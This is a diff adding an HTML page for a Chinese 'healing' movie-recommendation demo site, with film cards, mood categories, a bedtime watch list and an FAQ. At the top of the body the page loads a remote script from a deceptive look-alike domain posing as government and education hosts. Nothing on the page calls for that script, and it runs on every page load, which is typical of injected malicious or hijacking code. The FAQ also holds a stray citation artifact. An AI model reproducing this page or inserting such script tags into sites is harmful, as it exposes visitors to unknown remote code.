@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>毛毛电影网 - 毛绒治愈电影导航·动画/合家欢/萌宠/睡前片单 | 毛毛电影网</title>
+<meta name="description" content="毛毛电影网（maomaodianyingwang-h5）是毛绒治愈系电影导航：动画、合家欢、萌宠陪看、吉卜力风、睡前片单，像小猫毛毛陪你裹毛毯看片。">
+<meta name="keywords" content="毛毛电影网, maomaodianyingwang-h5, 治愈电影, 动画电影, 合家欢电影, 萌宠电影, 吉卜力, 睡前片单">
+<meta name="author" content="毛毛电影网">
+<meta name="robots" content="index,follow">
+<style>
+:root{
+  --cream:#fdf6ee;
+  --cream2:#f6e7d6;
+  --brown:#caa27a;
+  --brown-deep:#9c744f;
+  --orange:#ffb877;
+  --berry:#ff9bb3;
+  --moss:#9cc7a0;
+  --ink:#4a3b2f;
+  --ink2:#7a6655;
+  --muted:#a08b78;
+  --line:rgba(154,116,79,.22);
+  --radius:24px;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  background:
+    radial-gradient(820px 400px at 88% -6%,rgba(255,155,179,.20),transparent 60%),
+    radial-gradient(720px 360px at 0% 8%,rgba(156,199,160,.18),transparent 55%),
+    var(--cream);
+  color:var(--ink);
+  font-family:'PingFang SC','Microsoft YaHei','Nunito',sans-serif;
+  line-height:1.75;font-size:15px;min-height:100vh;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+
+/* 毛球 */
+.fluff{position:fixed;bottom:-30px;width:26px;height:26px;border-radius:50%;background:radial-gradient(circle at 30% 30%,#fff,var(--brown));opacity:.5;pointer-events:none;animation:up linear infinite}
+@keyframes up{to{transform:translateY(-120vh) rotate(360deg);opacity:0}}
+
+/* 顶栏 */
+.topbar{position:fixed;top:0;left:0;right:0;z-index:100;background:rgba(253,246,238,.92);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.topbar-inner{max-width:1240px;margin:0 auto;padding:12px 20px;display:flex;align-items:center;justify-content:space-between}
+.logo{font-size:20px;font-weight:900;display:flex;align-items:center;gap:10px}
+.logo .cat{font-size:24px}
+.logo b{color:var(--brown-deep)}
+.nav-menu{display:flex;gap:18px}
+.nav-menu a{color:var(--ink2);font-size:13px;font-weight:700;padding:6px 2px;position:relative;transition:.25s}
+.nav-menu a:hover{color:var(--berry)}
+.nav-menu a::after{content:'';position:absolute;left:0;bottom:-2px;height:2px;width:0;background:var(--berry);transition:.25s}
+.nav-menu a:hover::after{width:100%}
+
+/* Hero */
+.hero{margin-top:58px;padding:70px 20px 50px;position:relative;z-index:1}
+.hero-inner{max-width:1240px;margin:0 auto;display:grid;grid-template-columns:1.1fr .9fr;gap:44px;align-items:center}
+.hero-tag{display:inline-flex;align-items:center;gap:8px;padding:5px 14px;border:1px solid var(--line);background:rgba(255,184,119,.18);color:var(--brown-deep);font-size:11px;font-weight:800;letter-spacing:2px;text-transform:uppercase;margin-bottom:18px;border-radius:999px}
+.hero h1{font-size:clamp(34px,5vw,52px);font-weight:900;line-height:1.14;margin-bottom:16px}
+.hero h1 .fur{color:var(--berry)}
+.hero-desc{color:var(--ink2);font-size:15px;margin-bottom:26px;line-height:1.95}
+.hero-btns{display:flex;gap:12px;flex-wrap:wrap}
+.btn-main{padding:13px 30px;background:linear-gradient(90deg,var(--orange),var(--berry));color:#5a2a33;font-weight:800;font-size:14px;letter-spacing:1px;transition:.25s;border-radius:999px}
+.btn-main:hover{transform:translateY(-2px);box-shadow:0 12px 28px rgba(255,155,179,.35)}
+.btn-sub{padding:13px 30px;border:1px solid var(--brown-deep);color:var(--brown-deep);font-weight:700;font-size:14px;border-radius:999px;transition:.25s}
+.btn-sub:hover{background:rgba(154,116,79,.1)}
+
+/* 毛毛窝 */
+.fur-nest{position:relative;aspect-ratio:4/5;border-radius:32px;background:radial-gradient(circle at 50% 40%,#fff7ef,var(--cream2));border:1px solid var(--line);display:flex;align-items:center;justify-content:center;overflow:hidden}
+.fur-nest .ring{position:absolute;width:240px;height:240px;border-radius:50%;border:10px solid rgba(255,184,119,.35);animation:spin 18s linear infinite}
+.fur-nest .ring.r2{width:320px;height:320px;border-color:rgba(156,199,160,.3);animation-duration:26s;animation-direction:reverse}
+@keyframes spin{to{transform:rotate(360deg)}}
+.cat-face{position:relative;z-index:2;font-size:120px;filter:drop-shadow(0 12px 20px rgba(154,116,79,.25));animation:bob 3.2s ease-in-out infinite}
+@keyframes bob{50%{transform:translateY(-10px) rotate(-3deg)}}
+.fur-nest .say{position:absolute;bottom:18px;left:18px;right:18px;z-index:3;background:#fff;border:1px solid var(--line);border-radius:16px;padding:10px 14px;font-size:12px;color:var(--ink2)}
+.fur-nest .say b{color:var(--berry)}
+
+/* 栏目通用 */
+.section{max-width:1240px;margin:0 auto;padding:50px 20px;position:relative;z-index:1}
+.sec-head{margin-bottom:26px}
+.sec-head h2{font-size:26px;font-weight:900}
+.sec-head h2 .ac{color:var(--berry)}
+.sec-head p{color:var(--muted);font-size:13px;margin-top:4px}
+
+/* 喵影片单 */
+.meow-section{background:linear-gradient(180deg,transparent,rgba(246,231,214,.55))}
+.meow-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.meow{background:#fff;border:1px solid var(--line);border-radius:20px;overflow:hidden;cursor:pointer;transition:.28s}
+.meow:hover{transform:translateY(-5px) rotate(-1deg);box-shadow:0 18px 38px rgba(154,116,79,.2)}
+.meow-cover{aspect-ratio:3/4;display:flex;align-items:center;justify-content:center;font-size:46px;position:relative}
+.meow:nth-child(1) .meow-cover{background:linear-gradient(160deg,#ffe3ec,#ffb877)}
+.meow:nth-child(2) .meow-cover{background:linear-gradient(160deg,#dff3e0,#9cc7a0)}
+.meow:nth-child(3) .meow-cover{background:linear-gradient(160deg,#fff2dc,#caa27a)}
+.meow:nth-child(4) .meow-cover{background:linear-gradient(160deg,#e7e0ff,#ff9bb3)}
+.meow:nth-child(5) .meow-cover{background:linear-gradient(160deg,#dff0ff,#9cc7a0)}
+.meow:nth-child(6) .meow-cover{background:linear-gradient(160deg,#fff0d6,#ffb877)}
+.meow:nth-child(7) .meow-cover{background:linear-gradient(160deg,#ffe0ef,#caa27a)}
+.meow:nth-child(8) .meow-cover{background:linear-gradient(160deg,#e9fff0,#ff9bb3)}
+.meow-cover .paw{position:absolute;bottom:10px;right:10px;font-size:18px;opacity:.8}
+.meow-body{padding:12px 14px}
+.meow-body h3{font-size:14px;font-weight:800}
+.meow-body p{font-size:11px;color:var(--muted);margin-top:2px}
+.meow-body .tag{display:inline-block;margin-top:6px;font-size:10px;padding:2px 9px;border:1px solid var(--line);color:var(--brown-deep);border-radius:999px}
+
+/* 治愈四象限 */
+.quad-section{background:var(--cream2)}
+.quad-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:16px;max-width:900px;margin:0 auto}
+.quad{background:#fff;border:1px solid var(--line);border-radius:22px;padding:22px;transition:.25s;cursor:pointer}
+.quad:hover{transform:translateY(-4px);box-shadow:0 14px 30px rgba(154,116,79,.18)}
+.quad .emoji{font-size:30px}
+.quad h3{font-size:16px;font-weight:800;margin:6px 0 4px}
+.quad p{font-size:12px;color:var(--ink2);line-height:1.8}
+.quad:nth-child(1){border-bottom:4px solid var(--berry)}
+.quad:nth-child(2){border-bottom:4px solid var(--moss)}
+.quad:nth-child(3){border-bottom:4px solid var(--orange)}
+.quad:nth-child(4){border-bottom:4px solid var(--brown)}
+
+/* 萌宠陪看条 */
+.petbar-section{background:linear-gradient(180deg,var(--cream),var(--cream2))}
+.pet-strip{display:flex;gap:14px;overflow-x:auto;padding:6px 2px 16px;scroll-snap-type:x mandatory}
+.pet-strip::-webkit-scrollbar{height:6px}
+.pet-strip::-webkit-scrollbar-thumb{background:var(--brown)}
+.pet-strip::-webkit-scrollbar-track{background:rgba(154,116,79,.12)}
+.pet{min-width:220px;width:220px;flex-shrink:0;scroll-snap-align:start;background:#fff;border:1px solid var(--line);border-radius:18px;padding:18px;display:flex;gap:12px;align-items:center}
+.pet .face{font-size:34px}
+.pet h4{font-size:14px;font-weight:800}
+.pet p{font-size:11px;color:var(--muted);margin-top:2px}
+
+/* 睡前片单时间 */
+.bedtime-section{background:var(--cream2)}
+.bt-list{max-width:780px;margin:0 auto}
+.bt-row{display:grid;grid-template-columns:64px 1fr auto;gap:16px;align-items:center;padding:14px 16px;background:#fff;border:1px solid var(--line);border-radius:16px;margin-bottom:10px;cursor:pointer;transition:.25s}
+.bt-row:hover{transform:translateX(4px);border-color:var(--berry)}
+.bt-time{font-size:13px;font-weight:800;color:var(--brown-deep);text-align:center}
+.bt-main h3{font-size:15px;font-weight:800}
+.bt-main p{font-size:12px;color:var(--ink2)}
+.bt-mood{font-size:12px;font-weight:800;color:var(--berry);white-space:nowrap}
+
+/* 关于毛毛 */
+.about-section{background:var(--cream)}
+.about-grid{display:grid;grid-template-columns:1fr 1fr;gap:24px}
+.box{background:#fff;border:1px solid var(--line);border-radius:22px;padding:24px}
+.box h3{color:var(--brown-deep);font-size:16px;margin-bottom:10px}
+.box p{color:var(--ink2);font-size:13px;line-height:1.85;margin-bottom:8px}
+.faq{border-bottom:1px dashed var(--line);padding:12px 0}
+.faq:last-child{border-bottom:none}
+.faq b{color:var(--ink);font-size:13px}
+.faq p{color:var(--muted);font-size:12px;margin-top:4px}
+
+/* Footer */
+.footer{background:#5a4636;color:#f3e7da;padding:34px 20px 18px;text-align:center}
+.footer-logo{font-size:18px;font-weight:900;margin-bottom:10px}
+.footer-logo b{color:var(--orange)}
+.footer-links{display:flex;gap:18px;justify-content:center;flex-wrap:wrap;margin-bottom:14px}
+.footer-links a{color:#e9d8c7;font-size:12px}
+.footer-links a:hover{color:var(--orange)}
+.footer-copy{font-size:11px;border-top:1px solid rgba(255,255,255,.16);padding-top:14px}
+.footer-copy a{color:var(--orange)}
+
+@media(max-width:880px){
+  .hero-inner{grid-template-columns:1fr;gap:26px}
+  .fur-nest{order:-1;max-width:320px;margin:0 auto}
+  .meow-grid{grid-template-columns:repeat(2,1fr)}
+  .quad-grid{grid-template-columns:1fr}
+  .about-grid{grid-template-columns:1fr}
+  .nav-menu{gap:10px;flex-wrap:wrap;justify-content:center}
+  .topbar-inner{flex-direction:column;gap:8px}
+  .hero{margin-top:104px;padding:30px 16px}
+  .section{padding:36px 16px}
+  .sec-head h2{font-size:22px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<script>
+['🧶','🐾','☁️','🧦','🍮'].forEach(function(e,i){
+  var s=document.createElement('div');
+  s.className='fluff';s.textContent=e;
+  s.style.left=Math.random()*100+'vw';
+  s.style.animationDuration=(7+Math.random()*7)+'s';
+  s.style.animationDelay=(i*1.1)+'s';
+  document.body.appendChild(s);
+});
+</script>
+
+<div class="topbar">
+  <div class="topbar-inner">
+    <div class="logo"><span class="cat">🐱</span>毛毛<b>电影网</b></div>
+    <nav>
+      <ul class="nav-menu">
+        <li><a href="#meow">喵影片单</a></li>
+        <li><a href="#quad">治愈四象限</a></li>
+        <li><a href="#pet">萌宠陪看</a></li>
+        <li><a href="#bed">睡前片单</a></li>
+        <li><a href="#about">关于毛毛</a></li>
+      </ul>
+    </nav>
+  </div>
+</div>
+
+<!-- Hero -->
+<section class="hero">
+  <div class="hero-inner">
+    <div>
+      <span class="hero-tag">maomaodianyingwang-h5 · cozy movie den</span>
+      <h1>裹好毛毯<br>让<span class="fur">毛毛</span>递遥控器</h1>
+      <p class="hero-desc">毛毛电影网不推血腥、不推焦虑、不推擦边。只收“看完心里软一下”的片子：动画、合家欢、萌宠、吉卜力风、慢节奏爱情、睡前安抚片。像猫跳上膝盖，电影自己开始。</p>
+      <div class="hero-btns">
+        <a href="#meow" class="btn-main">🐾 开始撸片</a>
+        <a href="#bed" class="btn-sub">看睡前片单</a>
+      </div>
+    </div>
+    <div class="fur-nest">
+      <div class="ring"></div>
+      <div class="ring r2"></div>
+      <div class="cat-face">🐈</div>
+      <div class="say">毛毛说：<b>“今天别硬核，看点软的。”</b><br>已备好毛毯、热可可、10 部不费脑电影。</div>
+    </div>
+  </div>
+</section>
+
+<!-- 喵影片单 -->
+<section id="meow" class="section meow-section">
+  <div class="sec-head">
+    <h2>🎬 <span class="ac">喵影片单</span> · 毛毛亲自挑的 8 部</h2>
+    <p>动画 / 合家欢 / 萌宠 / 吉卜力风，全是可以二刷的软片</p>
+  </div>
+  <div class="meow-grid">
+    <div class="meow"><div class="meow-cover">🐉<span class="paw">🐾</span></div><div class="meow-body"><h3>龙猫</h3><p>1988 · 吉卜力 · 森林童话</p><span class="tag">合家欢</span></div></div>
+    <div class="meow"><div class="meow-cover">🐱<span class="paw">🧶</span></div><div class="meow-body"><h3>穿靴子的猫</h3><p>2011 · 动画 · 冒险搞笑</p><span class="tag">萌宠向</span></div></div>
+    <div class="meow"><div class="meow-cover">🏘️<span class="paw">🍮</span></div><div class="meow-body"><h3>哈尔的移动城堡</h3><p>2004 · 吉卜力 · 魔法治愈</p><span class="tag">慢热</span></div></div>
+    <div class="meow"><div class="meow-cover">🐶<span class="paw">🦴</span></div><div class="meow-body"><h3>忠犬八公</h3><p>2009 · 真人 · 哭点低</p><span class="tag">陪看必哭</span></div></div>
+    <div class="meow"><div class="meow-cover">🚂<span class="paw">☁️</span></div><div class="meow-body"><h3>千与千寻</h3><p>2001 · 吉卜力 · 成长</p><span class="tag">深夜神作</span></div></div>
+    <div class="meow"><div class="meow-cover">🧣<span class="paw">🧦</span></div><div class="meow-body"><h3>海洋奇缘</h3><p>2016 · 迪士尼 · 唱歌航海</p><span class="tag">不费脑</span></div></div>
+    <div class="meow"><div class="meow-cover">🐰<span class="paw">🌼</span></div><div class="meow-body"><h3>疯狂动物城</h3><p>2016 · 动画 · 悬疑甜</p><span class="tag">全年龄</span></div></div>
+    <div class="meow"><div class="meow-cover">🪶<span class="paw">🕯️</span></div><div class="meow-body"><h3>心灵奇旅</h3><p>2020 · 皮克斯 · 活着就好</p><span class="tag">治愈封神</span></div></div>
+  </div>
+</section>
+
+<!-- 治愈四象限 -->
+<section id="quad" class="section quad-section">
+  <div class="sec-head">
+    <h2>🌤️ <span class="ac">治愈四象限</span> · 你今晚想被怎么软到</h2>
+    <p>不是按类型分，是按“情绪温度”分</p>
+  </div>
+  <div class="quad-grid">
+    <div class="quad"><div class="emoji">🍵</div><h3>慢炖型</h3><p>没有大事件，只有做饭、走路、下雨、猫睡觉。适合刚下班、脑子嗡嗡响的人。</p></div>
+    <div class="quad"><div class="emoji">🌿</div><h3>自然型</h3><p>森林、麦田、海边小站、电车窗外。眼睛被洗一遍，肩颈自己松下来。</p></div>
+    <div class="quad"><div class="emoji">🧸</div><h3>抱抱型</h3><p>小狗、小猫、小机器人、小妖怪。主角不厉害，但你会想揉揉它。</p></div>
+    <div class="quad"><div class="emoji">🌙</div><h3>晚安型</h3><p>灯光暖、配乐轻、结局不炸。看完不刷手机，直接关灯睡觉那种。</p></div>
+  </div>
+</section>
+
+<!-- 萌宠陪看条 -->
+<section id="pet" class="section petbar-section">
+  <div class="sec-head">
+    <h2>🐾 <span class="ac">萌宠陪看</span> · 片里片外都有毛孩子</h2>
+    <p>横滑：今天让谁陪你看到片尾</p>
+  </div>
+  <div class="pet-strip">
+    <div class="pet"><div class="face">🐱</div><div><h4>毛毛（家猫）</h4><p>负责选片、踩键盘、片尾蹭你手背</p></div></div>
+    <div class="pet"><div class="face">🐶</div><div><h4>八公（秋田）</h4><p>适合哭片，别单独看《忠犬八公》</p></div></div>
+    <div class="pet"><div class="face">🐰</div><div><h4>朱迪（兔警官）</h4><p>适合周末白天，顺带补点正义感</p></div></div>
+    <div class="pet"><div class="face">🐉</div><div><h4>龙猫（森林神）</h4><p>雨伞梗 + 橡果 + 公交车，童年复位</p></div></div>
+    <div class="pet"><div class="face">🤖</div><div><h4>瓦力（小机器人）</h4><p>话少、眼神灵，社恐人电子宠物</p></div></div>
+    <div class="pet"><div class="face">🐱</div><div><h4>胖橘（流浪王）</h4><p>《猫的报恩》同款，慵懒但讲义气</p></div></div>
+  </div>
+</section>
+
+<!-- 睡前片单时间 -->
+<section id="bed" class="section bedtime-section">
+  <div class="sec-head">
+    <h2>🛏️ <span class="ac">睡前片单</span> · 22:00 以后别看刺激片</h2>
+    <p>毛毛排好的“关机片单”</p>
+  </div>
+  <div class="bt-list">
+    <div class="bt-row"><div class="bt-time">21:30</div><div class="bt-main"><h3>龙猫</h3><p>雨声、公交、毛球睡觉——最稳的入场</p></div><div class="bt-mood">🌿 放松</div></div>
+    <div class="bt-row"><div class="bt-time">21:55</div><div class="bt-main"><h3>借东西的小人阿莉埃蒂</h3><p>地板下的世界，镜头像怕吵醒人</p></div><div class="bt-mood">🍃 微光</div></div>
+    <div class="bt-row"><div class="bt-time">20:20</div><div class="bt-main"><h3>心灵奇旅</h3><p>“一条披萨、一片落叶都够活”的片</p></div><div class="bt-mood">✨ 回血</div></div>
+    <div class="bt-row"><div class="bt-time">20:45</div><div class="bt-main"><h3>凯尔经的秘密</h3><p>手绘像翻童话书，配乐一响就困</p></div><div class="bt-mood">📖 催眠</div></div>
+    <div class="bt-row"><div class="bt-time">21:10</div><div class="bt-main"><h3>岁月的童话</h3><p>成年人和小时候的自己喝茶</p></div><div class="bt-mood">🍵 慢炖</div></div>
+    <div class="bt-row"><div class="bt-time">21:35</div><div class="bt-main"><h3>玩具总动员 3</h3><p>哭完反而安心，适合周五收尾</p></div><div class="bt-mood">🧸 抱抱</div></div>
+  </div>
+</section>
+
+<!-- 关于毛毛 -->
+<section id="about" class="section about-section">
+  <div class="sec-head">
+    <h2>🐈 关于毛毛电影网</h2>
+    <p>“毛毛”不是盗版站，是猫，也是氛围</p>
+  </div>
+  <div class="about-grid">
+    <div class="box">
+      <h3>我们做的是什么</h3>
+      <p>毛毛电影网（maomaodianyingwang-h5）是<strong>毛绒治愈系电影导航</strong>：动画、合家欢、萌宠、吉卜力风、慢爱情、睡前片单，一个页面挑完。</p>
+      <p>“毛毛”既可以是猫（maomao ≈ 猫猫/毛绒），也可以是“毛乎乎、软乎乎”的看片状态。我们不做成人擦边、不做盗链大全，只做“看完心里软一下”的片单。</p>
+      <p>单页演示，内链统一 # 占位，可直接丢到 GitHub Pages。</p>
+    </div>
+    <div class="box">
+      <div class="faq"><b>Q：能直接播片吗？</b><p>A：本页是导航演示站，不存视频，卡片点击模拟跳详情。</p></div>
+      <div class="faq"><b>Q：网址是？</b><p>A：https://maomaodianyingwang-h5.github.io</p></div>
+      <div class="faq"><b>Q：和前几版区别？</b><p>A：前面有科幻/爱情/一级片库，这版是“猫系治愈 + 吉卜力温度 + 睡前场景”。</p></div>
+      <div class="faq"><b>Q：收录友好吗？</b><p>A：唯一 H1、语义化、关键词标题与描述，符合必应基础收录规则。[2,8](@ref)</p></div>
+    </div>
+  </div>
+</section>
+
+<div class="footer">
+  <div class="footer-logo">🐱 毛毛<b>电影网</b></div>
+  <div class="footer-links">
+    <a href="#meow">喵影片单</a>
+    <a href="#quad">治愈四象限</a>
+    <a href="#pet">萌宠陪看</a>
+    <a href="#bed">睡前片单</a>
+    <a href="#about">关于毛毛</a>
+  </div>
+  <div class="footer-copy">
+    &copy; 2026 毛毛电影网 (maomaodianyingwang-h5). 毛绒治愈系电影导航演示站.<br>
+    网站地址: <a href="https://maomaodianyingwang-h5.github.io">https://maomaodianyingwang-h5.github.io</a><br>
+    <span style="opacity:.7">毛毯 · 热可可 · 猫在腿上 · 电影开始</span>
+  </div>
+</div>
+
+<script>
+document.querySelectorAll('.meow').forEach(function(c){
+  c.addEventListener('click',function(){
+    alert('喵影片单：'+this.querySelector('h3').textContent+'\n\n静态演示页，点击后跳转到影片详情（内链 # 占位）。');
+  });
+});
+document.querySelectorAll('.quad').forEach(function(q){
+  q.addEventListener('click',function(){
+    alert('治愈象限：'+this.querySelector('h3').textContent+'\n\n静态演示页，点击后筛出该情绪的片子（内链 # 占位）。');
+  });
+});
+document.querySelectorAll('.pet').forEach(function(p){
+  p.addEventListener('click',function(){
+    alert('萌宠陪看：'+this.querySelector('h4').textContent+'\n\n静态演示页，点击后打开“带它看什么”片单（内链 # 占位）。');
+  });
+});
+document.querySelectorAll('.bt-row').forEach(function(r){
+  r.addEventListener('click',function(){
+    alert('睡前片单：'+this.querySelector('h3').textContent+'\n\n静态演示页，点击后跳转到该片简介（内链 # 占位）。');
+  });
+});
+document.querySelectorAll('.nav-menu a').forEach(function(a){
+  a.addEventListener('click',function(e){
+    e.preventDefault();
+    var el=document.querySelector(this.getAttribute('href'));
+    if(el) el.scrollIntoView({behavior:'smooth'});
+  });
+});
+</script>
+</body>
+</html>
